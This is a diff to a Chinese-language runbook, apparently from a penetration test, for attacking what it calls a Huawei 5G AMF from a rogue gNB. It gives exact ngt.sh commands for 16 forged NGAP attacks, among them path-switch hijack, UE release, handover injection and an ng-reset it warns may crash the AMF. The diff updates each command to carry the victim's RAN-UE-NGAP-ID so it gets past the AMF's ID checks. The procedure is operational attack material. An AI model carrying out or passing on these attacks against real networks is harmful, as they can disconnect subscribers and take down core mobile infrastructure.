@@ -95,7 +95,7 @@ sudo ./deploy/real-amf/capture-n3.sh path-switch
 ### 读 AU / GUTI
 
 ```bash
-./deploy/extract-ue-ids.sh          # 不要 sudo；抄 amf-ngap-id
+./deploy/extract-ue-ids.sh          # 不要 sudo；抄 amf-ngap-id（AU）和 ran-ngap-id（RU）
 ./deploy/extract-ue-ids.sh --guti   # InitialUE 两条才需要
 ```
 
@@ -103,16 +103,21 @@ GUTI 也可从终端 B 日志搜 `GUTI` / `5G-S-TMSI` / `TMSI`，或从注册过
 
 | 字段 | 填谁 |
 |---|---|
-| `amf-ngap-id` | `--amf-ue-id` / `--source-amf-ue-id` |
+| `amf-ngap-id`（AU） | `--amf-ue-id` / `--source-amf-ue-id` |
+| `ran-ngap-id`（RU，合法 gNB 上的） | 攻击 2/3/4/11–16 的 `--ran-ue-id`；`ng-reset` 写成 `<AU>:<RU>` |
 | AMF Set ID（10 bit） | `--amf-set-id 0x…` |
 | AMF Pointer（6 bit） | `--amf-pointer 0x…` |
 | 5G-TMSI（4 字节） | `--tmsi` 八位 hex，如 `c000019c` |
 
+华为 AMF 对 UE 关联消息会**同时校验 AU 和 RU**。只填 AU、RU 用默认 1/99（流氓本地）会被挡，不能写成「绑定成立」。  
+`path-switch` / `ho-window-inject` / `chain-ps-release` 的 `--ran-ue-id` 仍是流氓新 ID（默认 **99**），不要改成受害 RU。
+
 ### 三条铁律
 
-1. **不要用上次的 AU。** UE 一重注册就作废。
+1. **不要用上次的 AU/RU。** UE 一重注册就作废。
 2. **不要把两条破坏性攻击叠在同一会话上**（Path Switch 后再打 Release = 攻击 9，不是攻击 2）。
 3. **终端 C 无回 ≠ 失败。** Class-2 本来就常常不回攻击者。看 pcap 和受害侧。
+4. **挡住的 UE 关联消息必须带受害 RU 再打一次。** 仍挡 = 华为还校验发送方 SCTP；变成成立 = 上次只是 ID 对不齐。
 
 ### 现场不要做
 
@@ -175,28 +180,28 @@ GUTI 也可从终端 B 日志搜 `GUTI` / `5G-S-TMSI` / `TMSI`，或从注册过
 
 ## 攻击顺序（按这个表往下）
 
-| # | 命令 | 要 AU？ | 会拆 UE？ | 建议 |
-|---|---|---|---|---|
-| 1 | `path-switch` | 要 | 可能改绑 | 先做；做完重注册 |
-| 2 | `ue-release` | 要 | 可能 | 新会话，不要叠 1 |
-| 3 | `error-indication` | 要 | 可能 | 新会话 |
-| 4 | `handover-required` | 要 | 可能 | 新会话 |
-| 5 | `ho-window-inject` | 要 | 可能 | 新会话；开 N3 抓包 |
-| 6 | `ran-config-update` | 否 | 否 | 可复用会话 |
-| 7 | `ul-ran-config-transfer` | 否 | 否 | 看终端 A |
-| 8 | `initial-ue` | GUTI | 可能搅乱 | 先 `--guti` |
-| 9 | `chain-ps-release` | 要 | 是 | 新会话 |
-| 10 | `chain-initue-release` | GUTI+AU | 可能 | 先 `--guti` |
-| 11 | `handover-notify` | 要 | 可能 | Class-2 |
-| 12 | `pdu-notify` | 要 | 少见 | Class-2 |
-| 13 | `cell-trace` | 要 | 少见 | Class-2 |
-| 14 | `ul-ran-status` | 要 | 少见 | Class-2 |
-| 15 | `ul-nrppa` | 要 | 少见 | Class-2 |
-| 16 | `ng-reset` | 要 | 可能 + **可能打挂 AMF** | **最后做** |
+| # | 命令 | 要 AU？ | `--ran-ue-id` | 会拆 UE？ | 建议 |
+|---|---|---|---|---|---|
+| 1 | `path-switch` | 要 | 流氓 **99**（不要改成受害 RU） | 可能改绑 | 先做；做完重注册 |
+| 2 | `ue-release` | 要 | **受害 RU** | 可能 | 新会话，不要叠 1 |
+| 3 | `error-indication` | 要 | **受害 RU** | 可能 | 新会话 |
+| 4 | `handover-required` | 要 | **受害 RU** | 可能 | 新会话 |
+| 5 | `ho-window-inject` | 要 | 流氓 **99** | 可能 | 新会话；开 N3 抓包 |
+| 6 | `ran-config-update` | 否 | — | 否 | 可复用会话 |
+| 7 | `ul-ran-config-transfer` | 否 | — | 否 | 看终端 A |
+| 8 | `initial-ue` | GUTI | 流氓 **99**（新上下文） | 可能搅乱 | 先 `--guti` |
+| 9 | `chain-ps-release` | 要 | 流氓 **99**（与 PS 同一条） | 是 | 新会话 |
+| 10 | `chain-initue-release` | GUTI+AU | 流氓 **99** | 可能 | 先 `--guti` |
+| 11 | `handover-notify` | 要 | **受害 RU** | 可能 | Class-2 |
+| 12 | `pdu-notify` | 要 | **受害 RU** | 少见 | Class-2 |
+| 13 | `cell-trace` | 要 | **受害 RU** | 少见 | Class-2 |
+| 14 | `ul-ran-status` | 要 | **受害 RU** | 少见 | Class-2 |
+| 15 | `ul-nrppa` | 要 | **受害 RU** | 少见 | Class-2 |
+| 16 | `ng-reset` | 要 | **`<AU>:<RU>`** | 可能 + **可能打挂 AMF** | **最后做** |
 
 11–15 若 UE 还活着、AU 没变，可以同一会话连打，每条仍要单独抓 N2、单独填表。
 
-下面每条都是：命令 → 黑盒看什么 → 记录。`<AU>` 一律换成**这一次** `extract-ue-ids.sh` 的 `amf-ngap-id`。
+下面每条都是：命令 → 黑盒看什么 → 记录。`<AU>` / `<RU>` 一律换成**这一次** `extract-ue-ids.sh` 的 `amf-ngap-id` / `ran-ngap-id`。
 
 ---
 
@@ -255,10 +260,10 @@ N3 有无 TEID 0x11111111:
 ./deploy/real-amf/observe.sh before ue-release
 sudo ./deploy/real-amf/capture-n2.sh ue-release
 ./deploy/ngt.sh --evidence evidence/huawei-ue-release.jsonl \
-    ue-release --amf-ue-id <AU>
+    ue-release --amf-ue-id <AU> --ran-ue-id <RU>
 ```
 
-不要加 `--ran-ue-id`（默认 1 是流氓本地 ID）。
+必须带受害 `<RU>`。不要用默认 1（那是脚本占位，不是「华为认的那一对」）。
 
 **黑盒看什么**
 
@@ -276,11 +281,11 @@ C 回 Command + UE 还活 = 命令打回攻击者。
 C 无回 + UE 没变 = AU 错或静默丢，重读 AU 再打一次。
 
 ```
-日期 / AU:
+日期 / AU / RU:
 C 整行:
 N2：42 之后 41 出现在哪条 SCTP（合法 / 流氓 / 没有）:
 A / B / observe 打后:
-结论:
+结论（补齐 RU 后：成立 / 仍挡住）:
 ```
 
 ---
@@ -295,8 +300,10 @@ A / B / observe 打后:
 ./deploy/real-amf/observe.sh before error-indication
 sudo ./deploy/real-amf/capture-n2.sh error-indication
 ./deploy/ngt.sh --evidence evidence/huawei-error-indication.jsonl \
-    error-indication --amf-ue-id <AU>
+    error-indication --amf-ue-id <AU> --ran-ue-id <RU>
 ```
+
+必须带受害 `<RU>`。不写 RU 时这条默认甚至不带 RAN-UE-NGAP-ID，华为双校验一定空。
 
 **黑盒看什么**
 
@@ -309,11 +316,11 @@ sudo ./deploy/real-amf/capture-n2.sh error-indication
 | AMF 日志 | 该 IMSI 释放 / unknown UE 处理后释放 | 丢弃 / 绑定检查失败 |
 
 ```
-日期 / AU:
+日期 / AU / RU:
 C:
 N2：proc 9 之后合法侧有无 41:
 A/B/observe:
-结论（拆了 / 挡住 / 无回且无变化）:
+结论（补齐 RU 后：拆了 / 仍挡住 / 无回且无变化）:
 ```
 
 ---
@@ -328,10 +335,10 @@ A/B/observe:
 ./deploy/real-amf/observe.sh before handover-required
 sudo ./deploy/real-amf/capture-n2.sh handover-required
 ./deploy/ngt.sh --evidence evidence/huawei-ho-required.jsonl \
-    handover-required --amf-ue-id <AU>
+    handover-required --amf-ue-id <AU> --ran-ue-id <RU>
 ```
 
-`--ran-ue-id` 默认 **1**，`--target-gnb-id` 默认 **0**，TargetID 位长默认 **22**（与商用站 NG Setup 一致）。都不要加。流氓自己仍是 32-bit 的 4660，不要改 `huawei.json`。
+必须带受害 `<RU>`。`--target-gnb-id` 默认 **0**，TargetID 位长默认 **22**（与商用站 NG Setup 一致），不要改。流氓自己仍是 32-bit 的 4660，不要改 `huawei.json`。
 
 **黑盒看什么**
 
@@ -594,7 +601,7 @@ B/observe:
 ./deploy/real-amf/observe.sh before ho-notify
 sudo ./deploy/real-amf/capture-n2.sh ho-notify
 ./deploy/ngt.sh --evidence evidence/huawei-ho-notify.jsonl \
-    handover-notify --amf-ue-id <AU>
+    handover-notify --amf-ue-id <AU> --ran-ue-id <RU>
 ```
 
 **黑盒看什么**
@@ -624,7 +631,7 @@ N2：11 之后有无 41、在哪条 SCTP:
 ./deploy/real-amf/observe.sh before pdu-notify
 sudo ./deploy/real-amf/capture-n2.sh pdu-notify
 ./deploy/ngt.sh --evidence evidence/huawei-pdu-notify.jsonl \
-    pdu-notify --amf-ue-id <AU>
+    pdu-notify --amf-ue-id <AU> --ran-ue-id <RU>
 ```
 
 **黑盒看什么：** N2 上行 proc **30**；A/B/observe 有没有掉或会话异常；AMF 是否把 Notify 往 SMF 转（日志里 PDU session notify / 该 IMSI）。多数栈会忽略——**忽略也是结论**。
@@ -647,7 +654,7 @@ N2：只有 30，还是后面有 Error / 改会话:
 ./deploy/real-amf/observe.sh before cell-trace
 sudo ./deploy/real-amf/capture-n2.sh cell-trace
 ./deploy/ngt.sh --evidence evidence/huawei-cell-trace.jsonl \
-    cell-trace --amf-ue-id <AU>
+    cell-trace --amf-ue-id <AU> --ran-ue-id <RU>
 ```
 
 **黑盒看什么：** N2 上行 proc **2**；A/B 通常不应掉线；AMF 日志搜 Trace / TCE / `13.254.241.142`。会话无变化 = 忽略。
@@ -670,7 +677,7 @@ AMF 是否提到 TCE:
 ./deploy/real-amf/observe.sh before ul-ran-status
 sudo ./deploy/real-amf/capture-n2.sh ul-ran-status
 ./deploy/ngt.sh --evidence evidence/huawei-ul-ran-status.jsonl \
-    ul-ran-status --amf-ue-id <AU>
+    ul-ran-status --amf-ue-id <AU> --ran-ue-id <RU>
 ```
 
 **黑盒看什么：** N2 上行 proc **49**；有无 `DownlinkRANStatusTransfer` 回给流氓；A/B 有无异常。预期多为忽略。
@@ -693,7 +700,7 @@ N2:
 ./deploy/real-amf/observe.sh before ul-nrppa
 sudo ./deploy/real-amf/capture-n2.sh ul-nrppa
 ./deploy/ngt.sh --evidence evidence/huawei-ul-nrppa.jsonl \
-    ul-nrppa --amf-ue-id <AU>
+    ul-nrppa --amf-ue-id <AU> --ran-ue-id <RU>
 ```
 
 **黑盒看什么：** N2 上行 proc **50**；有无下行 NRPPa；A/B 不应无故掉线。忽略是常见结论。
@@ -718,7 +725,7 @@ N2:
 ./deploy/real-amf/observe.sh before ng-reset
 sudo ./deploy/real-amf/capture-n2.sh ng-reset
 ./deploy/ngt.sh --evidence evidence/huawei-ng-reset.jsonl \
-    ng-reset --targets <AU>:1
+    ng-reset --targets <AU>:<RU>
 ```
 
 若上面受害完全没变，**同一新 AU** 再打只带 AMF-ID 的变体（有的栈只在这条路径上全局查找）：
